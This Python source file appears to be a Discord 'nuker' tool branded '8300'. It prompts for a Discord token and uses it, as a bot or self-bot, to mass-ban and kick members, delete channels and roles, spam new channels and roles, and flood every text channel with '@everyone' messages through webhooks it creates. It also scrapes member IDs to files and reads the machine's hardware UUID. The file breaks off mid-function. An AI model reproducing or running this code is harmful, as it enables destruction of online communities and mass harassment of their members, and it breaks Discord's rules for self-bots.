import requests
import os
import sys
import threading
import time
import json
import asyncio
import discord
import aiohttp
import datetime
import subprocess
from colorama import Fore
import psutil
from colored import fg, attr

from colorama import Fore, Style
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands
from pypresence import Presence


date = datetime.datetime.now()
ok = date.strftime("%H:%M:%S")
def close():
    os._exit(0)

def writechar(text):
   for char in text:
     sys.stdout.write(char)
     sys.stdout.flush()
     time.sleep(0.1)

def Clear():
    os.system('cls')

os.system(f'cls & title 8300 NUKER')

def Clear():
    os.system('cls')


def clear():
    if sys.platform.startswith("win"):
        os.system('cls')
    elif sys.platform == 'linux' or 'darwin':
        os.system('clear')

class colors:

    red = fg('#ff004d8')
    reset = attr('reset')
    gray = fg('#ff4b00')
    gray = fg('#ff4b00')
    
os.system('cls')
print(f"""
                                             {Fore.LIGHTBLACK_EX}█████{colors.gray}╗ {Fore.LIGHTBLACK_EX}██████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██████{colors.gray}╗ 
                                            {Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗╚════{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╔═{Fore.LIGHTBLACK_EX}████{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╔═{Fore.LIGHTBLACK_EX}████{colors.gray}╗
                                            {Fore.LIGHTBLACK_EX}{colors.gray}╚{Fore.LIGHTBLACK_EX}█████{colors.gray}╔╝{Fore.LIGHTBLACK_EX} █████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║
                                            {Fore.LIGHTBLACK_EX}{Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗ ╚═══{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║
                                            {Fore.LIGHTBLACK_EX}{colors.gray}╚{Fore.LIGHTBLACK_EX}█████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝
                                             {colors.gray}╚════╝ ╚═════╝  ╚═════╝  ╚═════╝ 
                                       ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━        


                                         
{Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Debug{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Launching Server Stresser Firmware v1.0.0 by 8300.
""")
time.sleep(3)
os.system('cls')
print(f"""
                                             {Fore.LIGHTBLACK_EX}█████{colors.gray}╗ {Fore.LIGHTBLACK_EX}██████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██████{colors.gray}╗ 
                                            {Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗╚════{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╔═{Fore.LIGHTBLACK_EX}████{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╔═{Fore.LIGHTBLACK_EX}████{colors.gray}╗
                                            {Fore.LIGHTBLACK_EX}{colors.gray}╚{Fore.LIGHTBLACK_EX}█████{colors.gray}╔╝{Fore.LIGHTBLACK_EX} █████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║
                                            {Fore.LIGHTBLACK_EX}{Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗ ╚═══{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║
                                            {Fore.LIGHTBLACK_EX}{colors.gray}╚{Fore.LIGHTBLACK_EX}█████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝
                                             {colors.gray}╚════╝ ╚═════╝  ╚═════╝  ╚═════╝ 
                                       ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━         



{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Debug{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Launching Nuker Firmware v1.0.0 by 8300.                                         
· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Debug{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Machine enviroment check finished. Moving forward
""")
time.sleep(3)
os.system('cls')
print(f"""
                                             {Fore.LIGHTBLACK_EX}█████{colors.gray}╗ {Fore.LIGHTBLACK_EX}██████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██████{colors.gray}╗ 
                                            {Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗╚════{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╔═{Fore.LIGHTBLACK_EX}████{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╔═{Fore.LIGHTBLACK_EX}████{colors.gray}╗
                                            {Fore.LIGHTBLACK_EX}{colors.gray}╚{Fore.LIGHTBLACK_EX}█████{colors.gray}╔╝{Fore.LIGHTBLACK_EX} █████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║
                                            {Fore.LIGHTBLACK_EX}{Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗ ╚═══{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║
                                            {Fore.LIGHTBLACK_EX}{colors.gray}╚{Fore.LIGHTBLACK_EX}█████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝
                                             {colors.gray}╚════╝ ╚═════╝  ╚═════╝  ╚═════╝ 
                                       ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━      



{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Debug{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Launching NUKER Firmware v1.0.0 by 8300.                                         
{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Debug{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Machine enviroment check finished. Moving forward     
· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Info{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Machine uuid: [un7xd4980-a3a67-11e2-9144-6c3abe530dd0] is now being utilized.
""")
time.sleep(3)
os.system('cls')
hwid = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
print(f"""
                                             {Fore.LIGHTBLACK_EX}█████{colors.gray}╗ {Fore.LIGHTBLACK_EX}██████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██████{colors.gray}╗ 
                                            {Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗╚════{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╔═{Fore.LIGHTBLACK_EX}████{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╔═{Fore.LIGHTBLACK_EX}████{colors.gray}╗
                                            {Fore.LIGHTBLACK_EX}{colors.gray}╚{Fore.LIGHTBLACK_EX}█████{colors.gray}╔╝{Fore.LIGHTBLACK_EX} █████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║
                                            {Fore.LIGHTBLACK_EX}{Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗ ╚═══{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║
                                            {Fore.LIGHTBLACK_EX}{colors.gray}╚{Fore.LIGHTBLACK_EX}█████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝
                                             {colors.gray}╚════╝ ╚═════╝  ╚═════╝  ╚═════╝ 
                                       ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Debug{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Launching NUKER Firmware v1.0.0 by 8300.                                         
{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Debug{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Machine enviroment check finished. Moving forward     
{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Info{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Machine uuid: [{hwid}] is now being utilized.     
· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Watcher{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Machine passed checks sucessfully. Moving forward
""")
time.sleep(3)
os.system('cls')
print(f"""
                                             {Fore.LIGHTBLACK_EX}█████{colors.gray}╗ {Fore.LIGHTBLACK_EX}██████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██████{colors.gray}╗ 
                                            {Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗╚════{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╔═{Fore.LIGHTBLACK_EX}████{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╔═{Fore.LIGHTBLACK_EX}████{colors.gray}╗
                                            {Fore.LIGHTBLACK_EX}{colors.gray}╚{Fore.LIGHTBLACK_EX}█████{colors.gray}╔╝{Fore.LIGHTBLACK_EX} █████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║
                                            {Fore.LIGHTBLACK_EX}{Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗ ╚═══{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║
                                            {Fore.LIGHTBLACK_EX}{colors.gray}╚{Fore.LIGHTBLACK_EX}█████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝
                                             {colors.gray}╚════╝ ╚═════╝  ╚═════╝  ╚═════╝ 
                                       ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━       



{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Debug{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Launching NUKER Firmware v1.0.0 by 8300.                                         
{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Debug{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Machine enviroment check finished. Moving forward     
{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Info{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Machine uuid: [{hwid}] is now being utilized.     
{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Watcher{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Machine passed checks sucessfully. Moving forward     
· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Info{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX}Client version: 1.0.0 is up  to date.
""")
time.sleep(3)
os.system('cls')
print(f'''

                                             {Fore.LIGHTBLACK_EX}█████{colors.gray}╗ {Fore.LIGHTBLACK_EX}██████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██████{colors.gray}╗  {Fore.LIGHTBLACK_EX}██████{colors.gray}╗ 
                                            {Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗╚════{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╔═{Fore.LIGHTBLACK_EX}████{colors.gray}╗{Fore.LIGHTBLACK_EX}██{colors.gray}╔═{Fore.LIGHTBLACK_EX}████{colors.gray}╗
                                            {Fore.LIGHTBLACK_EX}{colors.gray}╚{Fore.LIGHTBLACK_EX}█████{colors.gray}╔╝{Fore.LIGHTBLACK_EX} █████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}██{colors.gray}╔{Fore.LIGHTBLACK_EX}██{colors.gray}║
                                            {Fore.LIGHTBLACK_EX}{Fore.LIGHTBLACK_EX}██{colors.gray}╔══{Fore.LIGHTBLACK_EX}██{colors.gray}╗ ╚═══{Fore.LIGHTBLACK_EX}██{colors.gray}╗{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║{Fore.LIGHTBLACK_EX}████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██{colors.gray}║
                                            {Fore.LIGHTBLACK_EX}{colors.gray}╚{Fore.LIGHTBLACK_EX}█████{colors.gray}╔╝{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝╚{Fore.LIGHTBLACK_EX}██████{colors.gray}╔╝
                                             {colors.gray}╚════╝ ╚═════╝  ╚═════╝  ╚═════╝ 
                                       ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
''')
key = input(f"·{Fore.LIGHTBLACK_EX}√{Fore.LIGHTBLACK_EX} {Fore.WHITE}[{Fore.LIGHTCYAN_EX}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{Fore.WHITE}]{colors.gray} AUTH KEY : {Fore.WHITE}")
key2 = input(f"·{Fore.LIGHTBLACK_EX}√{Fore.LIGHTBLACK_EX} {Fore.WHITE}[{Fore.LIGHTCYAN_EX}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{Fore.WHITE}]{colors.gray} INVITE : {Fore.WHITE} ")
token = input(f'·{Fore.LIGHTBLACK_EX}√{Fore.LIGHTBLACK_EX} {Fore.WHITE}[{Fore.LIGHTCYAN_EX}{Fore.LIGHTBLACK_EX}{ok}{Fore.LIGHTBLACK_EX}{Fore.WHITE}]{colors.gray} ENTER TOKEN : {Fore.WHITE}')
while True:
    if key =="83":
        print("")
        print(f"")
        break
    else:
        print("Invalid auth key! Restart the program!")

while True:
    if key2 =="8300":
        print("")
        print(f"")
        break
    else:
        print("Invalid invite! Restart the program!")

os.system('cls')

def check_token():
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
        return "bot"

token_type = check_token()
intents = discord.Intents.all()
intents.members = True

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, intents=intents)

client.remove_command("help")

class skid:

    def __init__(self):
        self.colour = '\x1b[38;5;56m'

    def BanMembers(self, guild, member):
        while True:
            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} punished  client Banned {Fore.LIGHTCYAN_EX} {Fore.GREEN}{member.strip()} {Fore.GREEN}")
                    break
                else:
                    break

    def KickMembers(self, guild, member):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} punished  client Kicked {Fore.LIGHTCYAN_EX} {Fore.GREEN}{member.strip()}")
                    break
                else:
                    break

    def DeleteChannels(self, guild, channel):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} punished channel delete {Fore.LIGHTCYAN_EX} {Fore.GREEN}{channel.strip()}")
                    break
                else:
                    break
    
    def DeleteChannels(self, guild, channel):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} punished client Created {Fore.LIGHTCYAN_EX} {Fore.GREEN}{channel.strip()}")
                    break
                else:
                    break

    def DeleteRoles(self, guild, role):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{role}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} punished client Created {Fore.LIGHTCYAN_EX} {Fore.GREEN}{role.strip()}")
                    break
                else:
                    break

    def SpamChannels(self, guild, name):
        while True:
            json = {'name': name, 'type': 0}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} punished client Created {Fore.LIGHTCYAN_EX} {Fore.GREEN}{name}")
                    break
                else:
                    break

    def SpamRoles(self, guild, name):
        while True:
            json = {'name': name}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} punished client Created {Fore.LIGHTCYAN_EX} {Fore.GREEN} {name}")
                    break
                else:
                    break

    def WebhookSend(self, webhook, message): #credits to anti
        while True:
            json = {
                'content': message if message != '' else "@everyone 8300 ON TOP",
                'tts': False,
                'username': '8300'
            }
            r = requests.post(f'{webhook}', json=json)
            if r.status_code == 429:
                  time.sleep(r.json()['retry_after'])
                  self.WebhookSend(webhook, message)
                  break
            else:
                if r.status_code == 204 or 201 or 200:
                    print(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} punished client sent {Fore.LIGHTCYAN_EX} {Fore.GREEN} {message}")
                    break
                else:
                    break

    
    async def SpamWebhook(self, guild_id, amount, message):
        guild = client.get_guild(int(guild_id))
        web_urls = []
        for channel in guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='DISCORD.GG/8300', reason="8300")
                print(f"{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} punished client created webhook")
                web_urls.append(webhook.url)
            except Exception as e:
                print(e)
        for url in web_urls:
              for i in range(amount):
               try:
                  threading.Thread(target=self.WebhookSend, args=(url, message,)).start()
               except Exception as e:
                 print(e)





    async def Scrape(self):
        guild = input(f'{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Server Id: {Fore.GREEN}')
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        members = await guildOBJ.chunk()

        try:
            os.remove("Scraped/members.txt")
            os.remove("Scraped/channels.txt")
            os.remove("Scraped/roles.txt")
        except:
            pass

        membercount = 0
        with open('Scraped/members.txt', 'a') as m:
            for member in members:
                m.write(str(member.id) + "\n")
                membercount += 1
            print(f"\n{colors.gray}[{colors.gray}{Fore.GREEN}√{Fore.GREEN}{colors.gray}]{colors.gray} {Fore.WHITE}· {colors.gray}[{colors.gray}{Fore.WHITE}{ok}{Fore.WHITE}{colors.gray}] {colors.gray}[{colors.gray}{Fore.WHITE}Client{Fore.WHITE}{colors.gray}] {Fore.LIGHTBLACK_EX} Scrapped {Fore.LIGHTCYAN_EX} {Fore.GREEN}{membercount} Members")
            m.close()

        channelcount = 0
        with open('Scraped/channels.txt', 'a') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + "\n")
                channelcount += 1
